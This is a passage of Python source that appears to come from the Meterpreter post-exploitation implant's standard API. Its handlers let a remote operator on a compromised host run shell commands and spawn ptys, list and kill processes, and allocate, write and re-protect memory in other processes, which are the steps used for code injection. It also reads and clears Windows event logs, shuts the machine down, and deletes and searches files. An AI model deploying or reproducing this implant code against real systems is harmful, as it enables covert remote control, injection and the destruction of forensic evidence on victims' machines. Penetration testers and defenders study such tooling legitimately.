        permissions = packet_get_tlv(request, TLV_TYPE_PROCESS_PERMS)['value']

        OpenProcess = ctypes.windll.kernel32.OpenProcess
        OpenProcess.argtypes = [ctypes.c_uint32, ctypes.c_bool, ctypes.c_uint32]
        OpenProcess.restype = ctypes.c_void_p
        handle = OpenProcess(permissions, inherit, pid)
    if not handle:
        return error_result_windows(), response
    meterpreter.processes[handle] = None
    debug_print('[*] added process id: ' + str(pid) + ', handle: ' + str(handle))
    response += tlv_pack(TLV_TYPE_HANDLE, handle)
    return ERROR_SUCCESS, response

@register_function
def stdapi_sys_process_close(request, response):
    proc_h_id = packet_get_tlv(request, TLV_TYPE_HANDLE)['value']
    if not proc_h_id:
        return ERROR_SUCCESS, response
    if not meterpreter.close_process(proc_h_id):
        return ERROR_FAILURE, response
    return ERROR_SUCCESS, response

@register_function
def stdapi_sys_process_execute(request, response):
    cmd = packet_get_tlv(request, TLV_TYPE_PROCESS_PATH)['value']
    raw_args = packet_get_tlv(request, TLV_TYPE_PROCESS_ARGUMENTS)
    if raw_args:
        raw_args = raw_args['value']
    else:
        raw_args = ""
    flags = packet_get_tlv(request, TLV_TYPE_PROCESS_FLAGS)['value']
    if len(cmd) == 0:
        return ERROR_FAILURE, response
    if os.path.isfile('/bin/sh') and (flags & PROCESS_EXECUTE_FLAG_SUBSHELL):
        if raw_args:
            cmd = cmd + ' ' + raw_args
        args = ['/bin/sh', '-c', cmd]
    else:
        args = [cmd]
        args.extend(shlex.split(raw_args))

    if (flags & PROCESS_EXECUTE_FLAG_CHANNELIZED):
        if has_pty and (flags & PROCESS_EXECUTE_FLAG_PTY):
            master, slave = pty.openpty()
            if has_termios:
                try:
                    settings = termios.tcgetattr(master)
                    termios.tcsetattr(master, termios.TCSADRAIN, settings)
                except:
                    pass
            proc_h = STDProcess(args, stdin=slave, stdout=slave, stderr=slave, bufsize=0, preexec_fn=os.setsid)
            proc_h.stdin = os.fdopen(master, 'wb')
            proc_h.stdout = os.fdopen(master, 'rb')
            proc_h.stderr = open(os.devnull, 'rb')
            proc_h.ptyfd = slave
        else:
            proc_h = STDProcess(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            proc_h.echo_protection = True
        proc_h.start()
    else:
        proc_h = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    proc_h_id = meterpreter.add_process(proc_h)
    response += tlv_pack(TLV_TYPE_PID, proc_h.pid)
    response += tlv_pack(TLV_TYPE_PROCESS_HANDLE, proc_h_id)
    if (flags & PROCESS_EXECUTE_FLAG_CHANNELIZED):
        channel_id = meterpreter.add_channel(MeterpreterProcess(proc_h))
        response += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_sys_process_get_info(request, response):
    proc_h = packet_get_tlv(request, TLV_TYPE_HANDLE).get('value')
    if not proc_h:
        return ERROR_INVALID_PARAMETER, response

    MAX_PATH = 260

    EnumProcessModules = ctypes.windll.Psapi.EnumProcessModules
    EnumProcessModules.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
    EnumProcessModules.restype = ctypes.c_long

    GetModuleFileNameExW = ctypes.windll.Psapi.GetModuleFileNameExW
    GetModuleFileNameExW.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong]
    GetModuleFileNameExW.restype = ctypes.c_ulong

    GetModuleBaseNameW = ctypes.windll.Psapi.GetModuleBaseNameW
    GetModuleBaseNameW.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong]
    GetModuleBaseNameW.restype = ctypes.c_ulong

    def enum_process_modules(hProcess):
        buf_count = 256
        while True:
            buffer = (ctypes.c_void_p * buf_count)()
            buf_size = ctypes.sizeof(buffer)
            needed = ctypes.c_ulong()
            if not EnumProcessModules(hProcess, ctypes.byref(buffer), buf_size, ctypes.byref(needed)):
                raise OSError('EnumProcessModules')
            if buf_size < needed.value:
                buf_count = needed.value // (buf_size // buf_count)
                continue
            count = needed.value // (buf_size // buf_count)
            return map(ctypes.c_void_p, buffer[:count])

    def get_module_name(hProcess, hModule):
        base_name_buffer = ctypes.create_unicode_buffer(MAX_PATH)
        if not GetModuleBaseNameW(hProcess, hModule, base_name_buffer, MAX_PATH):
            raise OSError('GetModuleBaseNameW')
        return base_name_buffer.value

    def get_module_filename(hProcess, hModule):
        buffer = ctypes.create_unicode_buffer(MAX_PATH)
        nSize = ctypes.c_ulong(MAX_PATH)
        if not GetModuleFileNameExW(hProcess, hModule, ctypes.byref(buffer), nSize):
            raise OSError('GetModuleFileNameExW')
        return buffer.value

    try:
        for hModule in enum_process_modules(proc_h):
            module_name = get_module_name(proc_h, hModule)
            module_filename = get_module_filename(proc_h, hModule)
            response += tlv_pack(TLV_TYPE_PROCESS_NAME, module_name)
            response += tlv_pack(TLV_TYPE_PROCESS_PATH, module_filename)
            break
    except OSError as error:
        debug_print('[-] method stdapi_sys_process_get_info failed on: ' + str(error))
        return error_result_windows(), response

    return ERROR_SUCCESS, response

@register_function
def stdapi_sys_process_getpid(request, response):
    response += tlv_pack(TLV_TYPE_PID, os.getpid())
    return ERROR_SUCCESS, response

@register_function
def stdapi_sys_process_kill(request, response):
    for pid in packet_enum_tlvs(request, TLV_TYPE_PID):
        pid = pid['value']
        if has_windll:
            k32 = ctypes.windll.kernel32
            proc_h = k32.OpenProcess(PROCESS_TERMINATE, False, pid)
            if not proc_h:
                return error_result_windows(), response
            if not k32.TerminateProcess(proc_h, 0):
                return error_result_windows(), response
        elif hasattr(os, 'kill'):
            os.kill(pid, 9)
        else:
            return ERROR_FAILURE, response
    return ERROR_SUCCESS, response

def stdapi_sys_process_get_processes_via_proc(request, response):
    for pid in os.listdir('/proc'):
        pgroup = bytes()
        if not os.path.isdir(os.path.join('/proc', pid)) or not pid.isdigit():
            continue
        cmdline_file = open(os.path.join('/proc', pid, 'cmdline'), 'rb')
        cmd = str(cmdline_file.read(512).replace(NULL_BYTE, bytes(' ', 'UTF-8')))
        status_data = str(open(os.path.join('/proc', pid, 'status'), 'rb').read())
        status_data = map(lambda x: x.split('\t',1), status_data.split('\n'))
        status = {}
        for k, v in filter(lambda x: len(x) == 2, status_data):
            status[k[:-1]] = v.strip()
        ppid = status.get('PPid')
        uid = status.get('Uid').split('\t', 1)[0]
        if has_pwd:
            uid = pwd.getpwuid(int(uid)).pw_name
        if cmd:
            pname = os.path.basename(cmd.split(' ', 1)[0])
            ppath = cmd
        else:
            pname = '[' + status['Name'] + ']'
            ppath = ''
        pgroup += tlv_pack(TLV_TYPE_PID, int(pid))
        if ppid:
            pgroup += tlv_pack(TLV_TYPE_PARENT_PID, int(ppid))
        pgroup += tlv_pack(TLV_TYPE_USER_NAME, uid)
        pgroup += tlv_pack(TLV_TYPE_PROCESS_NAME, pname)
        pgroup += tlv_pack(TLV_TYPE_PROCESS_PATH, ppath)
        response += tlv_pack(TLV_TYPE_PROCESS_GROUP, pgroup)
    return ERROR_SUCCESS, response

def stdapi_sys_process_get_processes_via_ps(request, response):
    ps_output = get_process_output(['ps', 'ax', '-w', '-o', 'pid,ppid,user,command'])

    output = ps_output.split('\n')
    output.pop(0)
    for process in output:
        process = process.split()
        if len(process) < 4:
            break
        pgroup  = bytes()
        pgroup += tlv_pack(TLV_TYPE_PID, int(process[0]))
        pgroup += tlv_pack(TLV_TYPE_PARENT_PID, int(process[1]))
        pgroup += tlv_pack(TLV_TYPE_USER_NAME, process[2])
        pgroup += tlv_pack(TLV_TYPE_PROCESS_NAME, os.path.basename(process[3]))
        pgroup += tlv_pack(TLV_TYPE_PROCESS_PATH, ' '.join(process[3:]))
        response += tlv_pack(TLV_TYPE_PROCESS_GROUP, pgroup)
    return ERROR_SUCCESS, response

def stdapi_sys_process_get_processes_via_windll(request, response):
    TH32CS_SNAPPROCESS = 2
    k32 = ctypes.windll.kernel32
    pe32 = PROCESSENTRY32()
    pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)
    proc_snap = k32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    result = k32.Process32First(proc_snap, ctypes.byref(pe32))
    if not result:
        return error_result_windows(), response
    while result:
        proc_h = k32.OpenProcess((PROCESS_QUERY_INFORMATION | PROCESS_VM_READ), False, pe32.th32ProcessID)
        if not proc_h:
            proc_h = k32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, pe32.th32ProcessID)
        exe_path = (ctypes.c_char * 1024)()
        success = False
        if hasattr(ctypes.windll.psapi, 'GetModuleFileNameExA'):
            success = ctypes.windll.psapi.GetModuleFileNameExA(proc_h, 0, exe_path, ctypes.sizeof(exe_path))
        elif hasattr(k32, 'GetModuleFileNameExA'):
            success = k32.GetModuleFileNameExA(proc_h, 0, exe_path, ctypes.sizeof(exe_path))
        if not success and hasattr(k32, 'QueryFullProcessImageNameA'):
            dw_sz = ctypes.c_uint32()
            dw_sz.value = ctypes.sizeof(exe_path)
            success = k32.QueryFullProcessImageNameA(proc_h, 0, exe_path, ctypes.byref(dw_sz))
        if not success and hasattr(ctypes.windll.psapi, 'GetProcessImageFileNameA'):
            success = ctypes.windll.psapi.GetProcessImageFileNameA(proc_h, exe_path, ctypes.sizeof(exe_path))
        if success:
            exe_path = ctypes.string_at(exe_path)
        else:
            exe_path = ''
        process_username = ''
        process_token_user_sid = get_token_user_sid(proc_h)
        if process_token_user_sid:
            process_username = get_username_from_sid(process_token_user_sid) or ''
        parch = windll_GetNativeSystemInfo()
        is_wow64 = ctypes.c_ubyte()
        is_wow64.value = 0
        if hasattr(k32, 'IsWow64Process'):
            if k32.IsWow64Process(proc_h, ctypes.byref(is_wow64)):
                if is_wow64.value:
                    parch = PROCESS_ARCH_X86
        pgroup  = bytes()
        pgroup += tlv_pack(TLV_TYPE_PID, pe32.th32ProcessID)
        pgroup += tlv_pack(TLV_TYPE_PARENT_PID, pe32.th32ParentProcessID)
        pgroup += tlv_pack(TLV_TYPE_USER_NAME, process_username)
        pgroup += tlv_pack(TLV_TYPE_PROCESS_NAME, pe32.szExeFile)
        pgroup += tlv_pack(TLV_TYPE_PROCESS_PATH, exe_path)
        pgroup += tlv_pack(TLV_TYPE_PROCESS_ARCH, parch)
        response += tlv_pack(TLV_TYPE_PROCESS_GROUP, pgroup)
        result = k32.Process32Next(proc_snap, ctypes.byref(pe32))
        k32.CloseHandle(proc_h)
    k32.CloseHandle(proc_snap)
    return ERROR_SUCCESS, response

@register_function
def stdapi_sys_process_get_processes(request, response):
    if os.path.isdir('/proc'):
        return stdapi_sys_process_get_processes_via_proc(request, response)
    elif has_windll:
        return stdapi_sys_process_get_processes_via_windll(request, response)
    else:
        return stdapi_sys_process_get_processes_via_ps(request, response)

@register_function_if(has_windll)
def stdapi_sys_process_memory_allocate(request, response):
    handle = packet_get_tlv(request, TLV_TYPE_HANDLE).get('value', 0)
    base   = packet_get_tlv(request, TLV_TYPE_BASE_ADDRESS).get('value', 0)
    size   = packet_get_tlv(request, TLV_TYPE_LENGTH).get('value', 0)
    alloc  = packet_get_tlv(request, TLV_TYPE_ALLOCATION_TYPE).get('value', 0)
    prot   = packet_get_tlv(request, TLV_TYPE_PROTECTION).get('value', 0)

    VirtualAllocEx = ctypes.windll.kernel32.VirtualAllocEx
    VirtualAllocEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
    VirtualAllocEx.restype = ctypes.c_void_p

    result = VirtualAllocEx(handle, base, size, alloc, prot)
    if not result:
        return error_result_windows(), response

    response += tlv_pack(TLV_TYPE_BASE_ADDRESS, result)
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_sys_process_memory_lock(request, response):
    base = packet_get_tlv(request, TLV_TYPE_BASE_ADDRESS).get('value', 0)
    size = packet_get_tlv(request, TLV_TYPE_LENGTH).get('value', 0)

    VirtualLock = ctypes.windll.kernel32.VirtualLock
    VirtualLock.argtypes = [ctypes.c_void_p, ctypes.c_size_t]
    VirtualLock.restype = ctypes.c_long

    if not VirtualLock(base, size):
        return error_result_windows(), response
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_sys_process_memory_unlock(request, response):
    base = packet_get_tlv(request, TLV_TYPE_BASE_ADDRESS).get('value', 0)
    size = packet_get_tlv(request, TLV_TYPE_LENGTH).get('value', 0)

    VirtualUnlock = ctypes.windll.kernel32.VirtualUnlock
    VirtualUnlock.argtypes = [ctypes.c_void_p, ctypes.c_size_t]
    VirtualUnlock.restype = ctypes.c_long

    if not VirtualUnlock(base, size):
        return error_result_windows(), response
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_sys_process_memory_read(request, response):
    ERROR_PARTIAL_COPY = 229
    handle = packet_get_tlv(request, TLV_TYPE_HANDLE).get('value')
    base = packet_get_tlv(request, TLV_TYPE_BASE_ADDRESS).get('value')
    size = packet_get_tlv(request, TLV_TYPE_LENGTH).get('value')

    if not (handle and base and size):
        return ERROR_INVALID_PARAMETER, response

    ReadProcessMemory = ctypes.windll.kernel32.ReadProcessMemory
    ReadProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
    ReadProcessMemory.restype = ctypes.c_bool

    buffer = ctypes.create_string_buffer(size)
    bytes_read = ctypes.c_size_t(0)
    if (not ReadProcessMemory(handle, base, ctypes.byref(buffer), ctypes.sizeof(buffer), ctypes.byref(bytes_read))) and (ctypes.windll.kernel32.GetLastError() != ERROR_PARTIAL_COPY):
        return error_result_windows(), response

    readed_data = buffer.raw[:bytes_read.value]
    response += tlv_pack(TLV_TYPE_PROCESS_MEMORY, readed_data)
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_sys_process_memory_write(request, response):
    ERROR_PARTIAL_COPY = 229
    handle = packet_get_tlv(request, TLV_TYPE_HANDLE).get('value')
    base = packet_get_tlv(request, TLV_TYPE_BASE_ADDRESS).get('value')
    data = packet_get_tlv(request, TLV_TYPE_PROCESS_MEMORY).get('value')

    if not (handle and base and data):
        return ERROR_INVALID_PARAMETER, response

    WriteProcessMemory = ctypes.windll.kernel32.WriteProcessMemory
    WriteProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
    WriteProcessMemory.restype = ctypes.c_bool

    written = ctypes.c_size_t(0)
    if (not WriteProcessMemory(handle, base, data, len(data), ctypes.byref(written))) and (ctypes.windll.kernel32.GetLastError() != ERROR_PARTIAL_COPY):
        return error_result_windows(), response

    response += tlv_pack(TLV_TYPE_LENGTH, written.value)
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_sys_process_memory_protect(request, response):
    handle = packet_get_tlv(request, TLV_TYPE_HANDLE).get('value')
    base   = packet_get_tlv(request, TLV_TYPE_BASE_ADDRESS).get('value')
    size   = packet_get_tlv(request, TLV_TYPE_LENGTH).get('value')
    prot   = packet_get_tlv(request, TLV_TYPE_PROTECTION).get('value')

    if not (handle and base and size):
        return ERROR_INVALID_PARAMETER, response

    VirtualProtectEx = ctypes.windll.kernel32.VirtualProtectEx
    VirtualProtectEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_void_p]
    VirtualProtectEx.restype = ctypes.c_long

    old_prot = ctypes.c_ulong()
    if not VirtualProtectEx(handle, base, size, prot, ctypes.byref(old_prot)):
        return error_result_windows(), response
    response += tlv_pack(TLV_TYPE_PROTECTION, old_prot.value)
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_sys_process_memory_query(request, response):
    handle = packet_get_tlv(request, TLV_TYPE_HANDLE).get('value')
    base = packet_get_tlv(request, TLV_TYPE_BASE_ADDRESS).get('value')

    if not handle:
        return ERROR_INVALID_PARAMETER, response

    VirtualQueryEx = ctypes.windll.kernel32.VirtualQueryEx
    VirtualQueryEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(MEMORY_BASIC_INFORMATION), ctypes.c_size_t]
    VirtualQueryEx.restype = ctypes.c_size_t

    info = MEMORY_BASIC_INFORMATION()
    size = VirtualQueryEx(handle, base, ctypes.byref(info), ctypes.sizeof(info))
    if size == 0:
        return error_result_windows(), response

    response += tlv_pack(TLV_TYPE_BASE_ADDRESS, info.BaseAddress or 0)
    response += tlv_pack(TLV_TYPE_ALLOC_BASE_ADDRESS, info.AllocationBase or 0)
    response += tlv_pack(TLV_TYPE_ALLOC_PROTECTION, info.AllocationProtect)
    response += tlv_pack(TLV_TYPE_LENGTH, info.RegionSize)
    response += tlv_pack(TLV_TYPE_MEMORY_STATE, info.State)
    response += tlv_pack(TLV_TYPE_PROTECTION, info.Protect)
    response += tlv_pack(TLV_TYPE_MEMORY_TYPE, info.Type)
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_sys_process_memory_free(request, response):
    handle = packet_get_tlv(request, TLV_TYPE_HANDLE).get('value', 0)
    base   = packet_get_tlv(request, TLV_TYPE_BASE_ADDRESS).get('value', 0)
    size   = packet_get_tlv(request, TLV_TYPE_LENGTH).get('value', 0)

    VirtualFreeEx = ctypes.windll.kernel32.VirtualFreeEx
    VirtualFreeEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong]
    VirtualFreeEx.restype = ctypes.c_long

    MEM_RELEASE = 0x00008000
    if not VirtualFreeEx(handle, base, size, MEM_RELEASE):
        return error_result_windows(), response
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_sys_power_exitwindows(request, response):
    SE_SHUTDOWN_NAME = "SeShutdownPrivilege"

    flags = packet_get_tlv(request, TLV_TYPE_POWER_FLAGS)['value']
    reason = packet_get_tlv(request, TLV_TYPE_POWER_REASON)['value']

    if not enable_privilege(SE_SHUTDOWN_NAME):
        return error_result_windows(), response

    ExitWindowsEx = ctypes.windll.user32.ExitWindowsEx
    ExitWindowsEx.argtypes = [ctypes.c_uint32, ctypes.c_ulong]
    ExitWindowsEx.restype = ctypes.c_int8
    if not ExitWindowsEx(flags, reason):
        return error_result_windows(), response
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_sys_eventlog_open(request, response):
    source_name = packet_get_tlv(request, TLV_TYPE_EVENT_SOURCENAME)['value']
    OpenEventLogA = ctypes.windll.advapi32.OpenEventLogA
    OpenEventLogA.argtypes = [ctypes.c_char_p, ctypes.c_char_p]
    OpenEventLogA.restype = ctypes.c_void_p
    handle = OpenEventLogA(None, bytes(source_name, 'UTF-8'))
    if not handle:
        return error_result_windows(), response
    response += tlv_pack(TLV_TYPE_EVENT_HANDLE, handle)
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_sys_eventlog_read(request, response):
    handle = packet_get_tlv(request, TLV_TYPE_EVENT_HANDLE)['value']
    flags = packet_get_tlv(request, TLV_TYPE_EVENT_READFLAGS)['value']
    offset = packet_get_tlv(request, TLV_TYPE_EVENT_RECORDOFFSET)['value']
    bytes_read = ctypes.c_uint32(0)
    bytes_needed = ctypes.c_uint32(0)
    ReadEventLogA = ctypes.windll.advapi32.ReadEventLogA
    ReadEventLogA.argtypes = [ctypes.c_void_p, ctypes.c_uint32, ctypes.c_uint32, ctypes.c_void_p, ctypes.c_uint32, ctypes.POINTER(ctypes.c_uint32), ctypes.POINTER(ctypes.c_uint32)]
    ReadEventLogA.restype = ctypes.c_bool
    if ReadEventLogA(handle, flags, offset, ctypes.byref(bytes_read), 0, ctypes.byref(bytes_read), ctypes.byref(bytes_needed)):
        return error_result_windows(), response
    buf = (ctypes.c_uint8 * bytes_needed.value)()
    if not ReadEventLogA(handle, flags, offset, buf, bytes_needed, ctypes.byref(bytes_read), ctypes.byref(bytes_needed)):
        return error_result_windows(), response
    record = ctstruct_unpack(EVENTLOGRECORD, buf)
    response += tlv_pack(TLV_TYPE_EVENT_RECORDNUMBER, record.RecordNumber)
    response += tlv_pack(TLV_TYPE_EVENT_TIMEGENERATED, record.TimeGenerated)
    response += tlv_pack(TLV_TYPE_EVENT_TIMEWRITTEN, record.TimeWritten)
    response += tlv_pack(TLV_TYPE_EVENT_ID, record.EventID)
    response += tlv_pack(TLV_TYPE_EVENT_TYPE, record.EventType)
    response += tlv_pack(TLV_TYPE_EVENT_CATEGORY, record.EventCategory)
    response += tlv_pack(TLV_TYPE_EVENT_DATA, ctarray_to_bytes(buf[record.DataOffset:record.DataOffset + record.DataLength]))
    event_string_buf = (ctypes.c_uint8 * len(buf[record.StringOffset:]))(*buf[record.StringOffset:])
    event_strings = ctarray_to_bytes(event_string_buf).split(NULL_BYTE, record.NumStrings)[:record.NumStrings]
    for event_string in event_strings:
        response += tlv_pack(TLV_TYPE_EVENT_STRING, event_string)
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_sys_eventlog_clear(request, response):
    handle = packet_get_tlv(request, TLV_TYPE_EVENT_HANDLE)['value']
    ClearEventLogA = ctypes.windll.advapi32.ClearEventLogA
    ClearEventLogA.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
    ClearEventLogA.restype = ctypes.c_bool
    if not ClearEventLogA(handle, None):
        return error_result_windows(), response
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_sys_eventlog_numrecords(request, response):
    handle = packet_get_tlv(request, TLV_TYPE_EVENT_HANDLE)['value']
    total = ctypes.c_uint32(0)
    GetNumberOfEventLogRecords = ctypes.windll.advapi32.GetNumberOfEventLogRecords
    GetNumberOfEventLogRecords.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint32)]
    GetNumberOfEventLogRecords.restype = ctypes.c_bool
    if not ctypes.windll.advapi32.GetNumberOfEventLogRecords(handle, ctypes.byref(total)):
        return error_result_windows(), response
    response += tlv_pack(TLV_TYPE_EVENT_NUMRECORDS, total.value)
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_sys_eventlog_oldest(request, response):
    handle = packet_get_tlv(request, TLV_TYPE_EVENT_HANDLE)['value']
    GetOldestEventLogRecord = ctypes.windll.advapi32.GetOldestEventLogRecord
    GetOldestEventLogRecord.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint32)]
    GetOldestEventLogRecord.restype = ctypes.c_bool
    oldest = ctypes.c_uint32(0)
    if not GetOldestEventLogRecord(handle, ctypes.byref(oldest)):
        return error_result_windows(), response
    response += tlv_pack(TLV_TYPE_EVENT_RECORDNUMBER, oldest.value)
    return ERROR_SUCCESS, response

@register_function_if(has_windll)
def stdapi_sys_eventlog_close(request, response):
    handle = packet_get_tlv(request, TLV_TYPE_EVENT_HANDLE)['value']
    CloseEventLog = ctypes.windll.advapi32.CloseEventLog
    CloseEventLog.argtypes = [ctypes.c_void_p]
    CloseEventLog.restype = ctypes.c_bool
    if not CloseEventLog(handle):
        return error_result_windows(), response
    return ERROR_SUCCESS, response

@register_function
def stdapi_fs_chdir(request, response):
    wd = packet_get_tlv(request, TLV_TYPE_DIRECTORY_PATH)['value']
    os.chdir(unicode(wd))
    return ERROR_SUCCESS, response

@register_function
def stdapi_fs_delete_dir(request, response):
    dir_path = packet_get_tlv(request, TLV_TYPE_DIRECTORY_PATH)['value']
    dir_path = unicode(dir_path)
    if os.path.islink(dir_path):
        del_func = os.unlink
    else:
        del_func = shutil.rmtree
    try:
        del_func(dir_path)
    except OSError:
        return ERROR_FAILURE, response
    return ERROR_SUCCESS, response

@register_function
def stdapi_fs_delete_file(request, response):
    file_path = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
    if has_windll:
        subprocess.call(unicode("attrib.exe -r ") + file_path)
    try:
        os.unlink(unicode(file_path))
    except OSError:
        return ERROR_FAILURE, response
    return ERROR_SUCCESS, response

@register_function
def stdapi_fs_file_expand_path(request, response):
    path_tlv = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
    if has_windll:
        path_tlv = ctypes.create_string_buffer(bytes(path_tlv, 'UTF-8'))
        path_out = (ctypes.c_char * 4096)()
        path_out_len = ctypes.windll.kernel32.ExpandEnvironmentStringsA(ctypes.byref(path_tlv), ctypes.byref(path_out), ctypes.sizeof(path_out))
        result = str(ctypes.string_at(path_out))
    elif path_tlv == '%COMSPEC%':
        result = '/bin/sh'
    elif path_tlv in ['%TEMP%', '%TMP%']:
        result = '/tmp'
    else:
        result = os.getenv(path_tlv, path_tlv)
    if not result:
        return ERROR_FAILURE, response
    response += tlv_pack(TLV_TYPE_FILE_PATH, result)
    return ERROR_SUCCESS, response

@register_function
def stdapi_fs_file_move(request, response):
    oldname = packet_get_tlv(request, TLV_TYPE_FILE_NAME)['value']
    newname = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
    os.rename(unicode(oldname), unicode(newname))
    return ERROR_SUCCESS, response

@register_function
def stdapi_fs_file_copy(request, response):
    oldname = packet_get_tlv(request, TLV_TYPE_FILE_NAME)['value']
    newname = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
    shutil.copyfile(unicode(oldname), unicode(newname))
    return ERROR_SUCCESS, response

@register_function_if(sys.platform == 'darwin' or sys.platform.startswith('linux'))
def stdapi_fs_chmod(request, response):
    path = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
    mode = packet_get_tlv(request, TLV_TYPE_FILE_MODE_T)['value']
    os.chmod(unicode(path), mode)
    return ERROR_SUCCESS, response

@register_function
def stdapi_fs_getwd(request, response):
    if hasattr(os, 'getcwdu'):
        wd = os.getcwdu()
    else:
        wd = os.getcwd()
    response += tlv_pack(TLV_TYPE_DIRECTORY_PATH, wd)
    return ERROR_SUCCESS, response

@register_function
def stdapi_fs_ls(request, response):
    path = packet_get_tlv(request, TLV_TYPE_DIRECTORY_PATH)['value']
    path = os.path.abspath(unicode(path))
    glob = '*'
    if any((c in ['*','[','?']) for c in path):
        glob = os.path.basename(path)
        path = os.path.dirname(path)
    for file_name in filter(lambda f: fnmatch.fnmatch(f, glob), os.listdir(path)):
        file_path = os.path.join(path, file_name)
        response += tlv_pack(TLV_TYPE_FILE_NAME, file_name)
        response += tlv_pack(TLV_TYPE_FILE_PATH, file_path)
        try:
            st_buf = get_stat_buffer(file_path)
        except OSError:
            st_buf = bytes()
        response += tlv_pack(TLV_TYPE_STAT_BUF, st_buf)
    return ERROR_SUCCESS, response

@register_function
def stdapi_fs_md5(request, response):
    try:
        import hashlib
        m = hashlib.md5()
    except ImportError:
        import md5
        m = md5.new()
    path = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
    m.update(open(path, 'rb').read())
    response += tlv_pack(TLV_TYPE_FILE_HASH, m.digest())
    return ERROR_SUCCESS, response

@register_function
def stdapi_fs_mkdir(request, response):
    dir_path = packet_get_tlv(request, TLV_TYPE_DIRECTORY_PATH)['value']
    dir_path = unicode(dir_path)
    if not os.path.isdir(dir_path):
        os.mkdir(dir_path)
    return ERROR_SUCCESS, response

@register_function
def stdapi_fs_search(request, response):
    search_root = packet_get_tlv(request, TLV_TYPE_SEARCH_ROOT).get('value', '.')
    if not search_root: # sometimes it's an empty string
        search_root = '.'
    search_root = unicode(search_root)
    glob = packet_get_tlv(request, TLV_TYPE_SEARCH_GLOB)['value']
    recurse = packet_get_tlv(request, TLV_TYPE_SEARCH_RECURSE)['value']
    start_date = packet_get_tlv(request,TLV_TYPE_SEARCH_M_START_DATE)
    end_date = packet_get_tlv(request,TLV_TYPE_SEARCH_M_END_DATE)
    if recurse:
        for root, dirs, files in os.walk(search_root):
            for f in filter(lambda f: fnmatch.fnmatch(f, glob), files):
                file_stat = os.stat(os.path.join(root, f))
                mtime = int(file_stat.st_mtime)
                if start_date and start_date['value'] > mtime:
                    continue
                if end_date and end_date['value'] < mtime:
                    continue
                file_tlv  = bytes()
                file_tlv += tlv_pack(TLV_TYPE_FILE_PATH, root)
                file_tlv += tlv_pack(TLV_TYPE_FILE_NAME, f)
                file_tlv += tlv_pack(TLV_TYPE_FILE_SIZE, file_stat.st_size)
                file_tlv += tlv_pack(TLV_TYPE_SEARCH_MTIME, mtime)
                response += tlv_pack(TLV_TYPE_SEARCH_RESULTS, file_tlv)
    else:
        for f in filter(lambda f: fnmatch.fnmatch(f, glob), os.listdir(search_root)):
            file_stat = os.stat(os.path.join(search_root, f))
            mtime = int(file_stat.st_mtime)
            if start_date and start_date['value'] > mtime:
                continue
            if end_date and end_date['value'] < mtime:
                continue
            file_tlv  = bytes()
            file_tlv += tlv_pack(TLV_TYPE_FILE_PATH, search_root)
            file_tlv += tlv_pack(TLV_TYPE_FILE_NAME, f)
            file_tlv += tlv_pack(TLV_TYPE_FILE_SIZE, file_stat.st_size)
            file_tlv += tlv_pack(TLV_TYPE_SEARCH_MTIME, mtime)
            response += tlv_pack(TLV_TYPE_SEARCH_RESULTS, file_tlv)
    return ERROR_SUCCESS, response

@register_function
def stdapi_fs_separator(request, response):
    response += tlv_pack(TLV_TYPE_STRING, os.sep)
    return ERROR_SUCCESS, response

@register_function
def stdapi_fs_sha1(request, response):
    try:
        import hashlib
        m = hashlib.sha1()
    except ImportError:
        import sha
        m = sha.new()
    path = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
    m.update(open(path, 'rb').read())
    response += tlv_pack(TLV_TYPE_FILE_HASH, m.digest())
    return ERROR_SUCCESS, response

@register_function
def stdapi_fs_stat(request, response):
    path = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
    st_buf = get_stat_buffer(unicode(path))
